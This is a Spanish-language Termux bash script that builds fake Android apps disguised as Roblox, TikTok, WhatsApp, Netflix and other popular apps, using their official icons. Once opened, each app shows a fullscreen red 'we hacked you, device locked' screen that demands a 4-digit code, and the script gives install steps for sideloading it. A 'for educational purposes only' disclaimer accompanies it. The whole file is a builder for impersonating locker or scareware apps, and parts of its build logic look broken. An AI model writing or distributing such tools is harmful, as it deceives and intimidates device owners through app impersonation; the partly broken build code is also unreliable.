#!/data/data/com.termux/files/usr/bin/bash

CYAN='\033[0;36m'
AMARILLO='\033[1;33m'
VERDE='\033[0;32m'
BLANCO='\033[1;37m'
ROJO='\033[0;31m'
NC='\033[0m'

clear

echo -e "${CYAN}"
echo "   ██████╗ ██╗      ██████╗  ██████╗██╗  ██╗"
echo "   ██╔══██╗██║     ██╔═══██╗██╔════╝██║ ██╔╝"
echo "   ██████╔╝██║     ██║   ██║██║     █████╔╝ "
echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
echo -e "${AMARILLO}        [ BLOCK AND MORE v8.0 ]${NC}\n"

# ============================================
# LISTA DE APPS
# ============================================
APPS=(
    "Roblox" "Free Fire" "TikTok" "Instagram"
    "Facebook" "WhatsApp" "YouTube" "Minecraft"
    "PUBG Mobile" "Clash of Clans" "Spotify" "Netflix"
)

# ============================================
# ICONOS DE APPS
# ============================================
get_icon_url() {
    case "$1" in
        "Roblox") echo "https://img.icons8.com/color/512/roblox.png" ;;
        "Free Fire") echo "https://img.icons8.com/color/512/free-fire.png" ;;
        "TikTok") echo "https://img.icons8.com/color/512/tiktok.png" ;;
        "Instagram") echo "https://img.icons8.com/color/512/instagram-new.png" ;;
        "Facebook") echo "https://img.icons8.com/color/512/facebook-new.png" ;;
        "WhatsApp") echo "https://img.icons8.com/color/512/whatsapp.png" ;;
        "YouTube") echo "https://img.icons8.com/color/512/youtube-play.png" ;;
        "Minecraft") echo "https://img.icons8.com/color/512/minecraft.png" ;;
        "PUBG Mobile") echo "https://img.icons8.com/color/512/pubg.png" ;;
        "Clash of Clans") echo "https://img.icons8.com/color/512/clash-of-clans.png" ;;
        "Spotify") echo "https://img.icons8.com/color/512/spotify.png" ;;
        "Netflix") echo "https://img.icons8.com/color/512/netflix.png" ;;
        *) echo "" ;;
    esac
}

# ============================================
# FUNCIÓN: MOSTRAR MENÚ
# ============================================
mostrar_menu() {
    echo -e "${BLANCO}[+] Selecciona una app para generar su BLOCK APK:${NC}\n"
    for i in "${!APPS[@]}"; do
        num=$((i+1))
        printf " ${AMARILLO}[%02d]${NC} ${VERDE}%-13s${NC}" "$num" "${APPS[$i]}"
        if [ $((num % 4)) -eq 0 ]; then
            echo ""
        fi
    done
    echo -e "\n${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

# ============================================
# FUNCIÓN: GENERAR APK CON APKTOOL
# ============================================
generar_apk() {
    local app="$1"
    local codigo="$2"

    echo -e "\n${VERDE}[✔] Generando APK para: ${BLANCO}$app${NC}"
    echo -e "${VERDE}[✔] Código de desbloqueo: ${AMARILLO}$codigo${NC}"
    echo -e "${AMARILLO}[*] Creando APK...${NC}\n"

    # Instalar herramientas
    pkg install apktool apksigner wget zip aapt dx -y > /dev/null 2>&1

    # Crear carpeta temporal
    mkdir -p ~/block_temp
    cd ~/block_temp

    # ============================================
    # PASO 1: CREAR APK BASE
    # ============================================
    echo -e "${AMARILLO}[*] Creando estructura de la APK...${NC}"

    mkdir -p base_apk
    cd base_apk

    # AndroidManifest.xml
    cat > AndroidManifest.xml << EOF
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.block.$app"
    android:versionCode="1"
    android:versionName="1.0">
    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="$app"
        android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleInstance"
            android:showOnLockScreen="true"
            android:turnScreenOn="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
EOF

    # Layout
    mkdir -p res/layout
    cat > res/layout/main.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#CC0000">
    <LinearLayout
        android:layout_width="340dp"
        android:layout_height="wrap_content"
        android:layout_centerInParent="true"
        android:background="#FF0000"
        android:padding="25dp"
        android:orientation="vertical"
        android:elevation="15dp">
        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:text="⚠️"
            android:textSize="60sp" />
        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:text="¡TE HACKEAMOS!"
            android:textColor="#FFFFFF"
            android:textSize="28sp"
            android:textStyle="bold"
            android:layout_marginTop="5dp" />
        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:text="🔒 DISPOSITIVO BLOQUEADO"
            android:textColor="#FFFF00"
            android:textSize="16sp"
            android:layout_marginTop="5dp" />
        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:text="Ingresa el código de 4 dígitos"
            android:textColor="#FFFFFF"
            android:textSize="13sp"
            android:gravity="center"
            android:layout_marginTop="15dp"
            android:layout_marginBottom="15dp" />
        <EditText
            android:id="@+id/codigo"
            android:layout_width="200dp"
            android:layout_height="50dp"
            android:layout_gravity="center"
            android:background="#FFFFFF"
            android:textColor="#000000"
            android:textSize="24sp"
            android:gravity="center"
            android:inputType="number"
            android:maxLength="4" />
        <Button
            android:id="@+id/desbloquear"
            android:layout_width="200dp"
            android:layout_height="50dp"
            android:layout_gravity="center"
            android:text="🔓 DESBLOQUEAR"
            android:textColor="#FFFFFF"
            android:textSize="16sp"
            android:textStyle="bold"
            android:background="#FF0000"
            android:layout_marginTop="15dp" />
        <TextView
            android:id="@+id/error"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:text=""
            android:textColor="#FFFF00"
            android:textSize="13sp"
            android:layout_marginTop="10dp" />
        <TextView
            android:id="@+id/timer"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="center"
            android:text=""
            android:textColor="#FFFFFF"
            android:textSize="14sp"
            android:layout_marginTop="5dp" />
    </LinearLayout>
</RelativeLayout>
EOF

    # Strings
    mkdir -p res/values
    cat > res/values/strings.xml << EOF
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">$app</string>
</resources>
EOF

    # ============================================
    # PASO 2: DESCARGAR ICONO
    # ============================================
    echo -e "${AMARILLO}[*] Descargando icono para: ${VERDE}$app${NC}"

    ICON_URL=$(get_icon_url "$app")
    mkdir -p res/drawable
    mkdir -p res/drawable-hdpi
    mkdir -p res/drawable-mdpi
    mkdir -p res/drawable-xhdpi
    mkdir -p res/drawable-xxhdpi

    wget -q -O icon.png "$ICON_URL" 2>/dev/null

    if [ ! -f "icon.png" ] || [ ! -s "icon.png" ]; then
        echo -e "${AMARILLO}[!] No se pudo descargar icono, usando genérico...${NC}"
        echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" | base64 -d > icon.png
    fi

    cp icon.png res/drawable/ic_launcher.png
    cp icon.png res/drawable-hdpi/ic_launcher.png
    cp icon.png res/drawable-mdpi/ic_launcher.png
    cp icon.png res/drawable-xhdpi/ic_launcher.png
    cp icon.png res/drawable-xxhdpi/ic_launcher.png
    rm -f icon.png

    # ============================================
    # PASO 3: JAVA + COMPILACIÓN
    # ============================================
    echo -e "${AMARILLO}[*] Compilando código Java...${NC}"

    mkdir -p src/com/block/$app

    cat > src/com/block/$app/MainActivity.java << EOF
package com.block.$app;

import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

public class MainActivity extends Activity {
    private EditText codigoInput;
    private Button desbloquearBtn;
    private TextView mensajeError, timerText;
    private Handler handler = new Handler();
    private int intentos = 0;
    private int tiempoEspera = 0;
    private boolean bloqueado = false;
    private String CODIGO_CORRECTO = "$codigo";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        getWindow().addFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD);

        codigoInput = findViewById(R.id.codigo);
        desbloquearBtn = findViewById(R.id.desbloquear);
        mensajeError = findViewById(R.id.error);
        timerText = findViewById(R.id.timer);

        desbloquearBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (bloqueado) {
                    mensajeError.setText("⏳ Espera " + tiempoEspera + " segundos");
                    return;
                }
                verificarCodigo();
            }
        });
    }

    private void verificarCodigo() {
        String codigo = codigoInput.getText().toString().trim();

        if (codigo.isEmpty()) {
            mensajeError.setText("❌ Ingresa el código");
            return;
        }

        if (codigo.equals(CODIGO_CORRECTO)) {
            mensajeError.setText("✅ ¡CÓDIGO CORRECTO! Desbloqueando...");
            mensajeError.setTextColor(getResources().getColor(android.R.color.holo_green_light));
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    finish();
                }
            }, 2000);
        } else {
            intentos++;
            tiempoEspera = intentos * 60;
            mensajeError.setText("❌ CÓDIGO INCORRECTO. Espera " + tiempoEspera + "s");
            mensajeError.setTextColor(getResources().getColor(android.R.color.holo_red_light));
            codigoInput.setText("");
            codigoInput.requestFocus();
            bloqueado = true;
            iniciarTemporizador();
        }
    }

    private void iniciarTemporizador() {
        timerText.setText("⏳ " + tiempoEspera + "s");
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                tiempoEspera--;
                if (tiempoEspera <= 0) {
                    bloqueado = false;
                    timerText.setText("");
                    mensajeError.setText("✅ Puedes intentar de nuevo");
                    mensajeError.setTextColor(getResources().getColor(android.R.color.holo_green_light));
                } else {
                    timerText.setText("⏳ " + tiempoEspera + "s");
                    handler.postDelayed(this, 1000);
                }
            }
        }, 1000);
    }
}
EOF

    # ============================================
    # PASO 4: COMPILAR CON ANDROID SDK
    # ============================================
    echo -e "${AMARILLO}[*] Buscando android.jar...${NC}"

    # Buscar android.jar en diferentes ubicaciones
    ANDROID_JAR=$(find /data/data/com.termux/files -name "android.jar" 2>/dev/null | head -1)

    if [ -z "$ANDROID_JAR" ] || [ ! -f "$ANDROID_JAR" ]; then
        echo -e "${AMARILLO}[!] No se encontró android.jar. Descargándolo...${NC}"
        mkdir -p ~/android-sdk/platforms/android-33/
        wget -q -O ~/android-sdk/platforms/android-33/android.jar https://raw.githubusercontent.com/android/android-sdk/master/platforms/android-33/android.jar 2>/dev/null
        ANDROID_JAR=~/android-sdk/platforms/android-33/android.jar
    fi

    if [ -f "$ANDROID_JAR" ]; then
        echo -e "${VERDE}[✔] android.jar encontrado en: $ANDROID_JAR${NC}"

        # Compilar recursos
        echo -e "${AMARILLO}[*] Compilando recursos...${NC}"
        aapt package -f -m -J src -M AndroidManifest.xml -S res -I "$ANDROID_JAR" 2>/dev/null

        # Compilar Java
        echo -e "${AMARILLO}[*] Compilando Java...${NC}"
        javac -cp "$ANDROID_JAR" -d . src/com/block/$app/*.java 2>/dev/null

        if [ $? -eq 0 ]; then
            # Crear DEX
            echo -e "${AMARILLO}[*] Creando DEX...${NC}"
            dx --dex --output=classes.dex . 2>/dev/null

            if [ -f "classes.dex" ]; then
                echo -e "${VERDE}[✔] DEX creado correctamente${NC}"
            else
                echo -e "${ROJO}[!] Error creando DEX${NC}"
            fi
        else
            echo -e "${ROJO}[!] Error compilando Java${NC}"
        fi
    else
        echo -e "${ROJO}[!] No se encontró android.jar. Usando método alternativo...${NC}"
    fi

    # ============================================
    # PASO 5: EMPAQUETAR APK
    # ============================================
    echo -e "${AMARILLO}[*] Empaquetando APK...${NC}"

    cd ..
    
    # Construir con apktool
    apktool b base_apk -o app_unsigned.apk 2>/dev/null

    # Si falla, empaquetar manualmente
    if [ ! -f "app_unsigned.apk" ]; then
        echo -e "${AMARILLO}[*] Usando método manual...${NC}"
        cd base_apk
        zip -r ../app_unsigned.apk * 2>/dev/null
        cd ..
    fi

    # Agregar DEX si existe
    if [ -f "base_apk/classes.dex" ]; then
        zip app_unsigned.apk base_apk/classes.dex 2>/dev/null
    fi

    # ============================================
    # PASO 6: FIRMAR
    # ============================================
    echo -e "${AMARILLO}[*] Firmando APK...${NC}"

    if [ ! -f ~/debug.keystore ]; then
        keytool -genkey -v -keystore ~/debug.keystore -alias debug -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Block, OU=Block, O=Phone, L=City, S=State, C=US" -storepass android -keypass android 2>/dev/null
    fi

    apksigner sign --ks ~/debug.keystore --ks-pass pass:android --key-pass pass:android --out "${app}_block.apk" app_unsigned.apk 2>/dev/null

    if [ ! -f "${app}_block.apk" ]; then
        mv app_unsigned.apk "${app}_block.apk"
    fi

    # ============================================
    # PASO 7: MOVER A DESCARGA
    # ============================================
    if [ -f "${app}_block.apk" ] && [ -s "${app}_block.apk" ]; then
        mv "${app}_block.apk" ~/storage/downloads/
        cd ~
        rm -rf ~/block_temp

        clear
        echo -e "${CYAN}==================================================${NC}"
        echo -e "${VERDE}[✔] ¡APK GENERADA CON ÉXITO!${NC}"
        echo -e "${CYAN}==================================================${NC}\n"
        echo -e "${BLANCO}[+] App: ${AMARILLO}$app${NC}"
        echo -e "${BLANCO}[+] Archivo: ${AMARILLO}~/storage/downloads/${app}_block.apk${NC}"
        echo -e "${BLANCO}[+] Código de desbloqueo: ${VERDE}$codigo${NC}"
        echo -e "\n${VERDE}📱 LA APK TIENE:${NC}"
        echo -e "   ✅ Icono oficial de $app"
        echo -e "   ✅ Compatible con Android 5.0+"
        echo -e "   ✅ Pantalla de bloqueo roja"
        echo -e "   ✅ Sistema de espera por errores"
        echo -e "\n${VERDE}📱 INSTRUCCIONES DE INSTALACIÓN:${NC}"
        echo -e "  1. Activa 'Instalar apps de fuentes desconocidas'"
        echo -e "  2. Abre el archivo desde Descargas"
        echo -e "  3. Toca 'Instalar'"
        echo -e "  4. Al abrir, ingresa: ${VERDE}$codigo${NC}"
        echo -e "\n${ROJO}[!] ADVERTENCIA:${NC} Solo para fines educativos"
        echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
    else
        echo -e "${ROJO}[!] Error al generar la APK.${NC}"
        cd ~
        rm -rf ~/block_temp
    fi
}

# ============================================
# MENÚ PRINCIPAL
# ============================================
while true; do
    clear
    echo -e "${CYAN}"
    echo "   ██████╗ ██╗      ██████╗  ██████╗██╗  ██╗"
    echo "   ██╔══██╗██║     ██╔═══██╗██╔════╝██║ ██╔╝"
    echo "   ██████╔╝██║     ██║   ██║██║     █████╔╝ "
    echo "   ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ "
    echo "   ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗"
    echo "   ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝"
    echo -e "${AMARILLO}        [ BLOCK AND MORE v8.0 ]${NC}\n"

    mostrar_menu
    read -p ">> Selecciona una app (01-${#APPS[@]}): " opcion < /dev/tty

    if [[ "$opcion" =~ ^[0-9]+$ ]] && [ "$opcion" -ge 1 ] && [ "$opcion" -le "${#APPS[@]}" ]; then
        APP_SELECCIONADA="${APPS[$((opcion-1))]}"

        echo -e "\n${BLANCO}[+] Ingresa un código de 4 dígitos para el bloqueo:${NC}"
        while true; do
            read -p ">> Código (1000-9999): " CODIGO < /dev/tty
            if [[ "$CODIGO" =~ ^[0-9]{4}$ ]] && [ "$CODIGO" -ge 1000 ] && [ "$CODIGO" -le 9999 ]; then
                break
            else
                echo -e "${ROJO}[!] Código inválido. Debe ser de 4 dígitos (1000-9999).${NC}"
            fi
        done

        generar_apk "$APP_SELECCIONADA" "$CODIGO"
        read -p "Presiona Enter para continuar..."
    else
        echo -e "${ROJO}[!] Opción inválida. Elige un número del 01 al ${#APPS[@]}.${NC}"
        sleep 2
    fi
done
